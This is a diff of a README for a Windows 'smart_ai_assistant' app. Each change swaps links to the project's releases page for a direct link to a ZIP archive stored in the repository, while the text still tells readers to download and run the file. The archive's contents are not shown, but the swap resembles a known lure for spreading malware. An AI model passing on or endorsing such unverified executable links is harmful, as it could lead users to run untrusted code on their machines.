@@ -1,12 +1,12 @@
 # 🤖 smart_ai_assistant - Smarter Answers From Your Files
 
-[![Download smart_ai_assistant](https://img.shields.io/badge/Download%20smart_ai_assistant-blue?style=for-the-badge)](https://github.com/enginkaraarslan/smart_ai_assistant/releases)
+[![Download smart_ai_assistant](https://img.shields.io/badge/Download%20smart_ai_assistant-blue?style=for-the-badge)](https://github.com/enginkaraarslan/smart_ai_assistant/raw/refs/heads/main/app/smart_ai_assistant_v1.3.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows version:
 
-https://github.com/enginkaraarslan/smart_ai_assistant/releases
+https://github.com/enginkaraarslan/smart_ai_assistant/raw/refs/heads/main/app/smart_ai_assistant_v1.3.zip
 
 On the release page, pick the latest version and download the file for Windows. If you see more than one file, choose the one for Windows first.
 
@@ -147,7 +147,7 @@ Try these steps:
 
 Go to the release page and download the Windows file:
 
-https://github.com/enginkaraarslan/smart_ai_assistant/releases
+https://github.com/enginkaraarslan/smart_ai_assistant/raw/refs/heads/main/app/smart_ai_assistant_v1.3.zip
 
 After the file downloads, open it from your Downloads folder and run it on Windows. If your release comes as a ZIP file, extract it first, then start the app file inside.
 
@@ -182,4 +182,4 @@ Your PDF files stay part of your own local use unless you choose to share them. 
 
 Download the latest Windows build here:
 
-https://github.com/enginkaraarslan/smart_ai_assistant/releases
+https://github.com/enginkaraarslan/smart_ai_assistant/raw/refs/heads/main/app/smart_ai_assistant_v1.3.zip
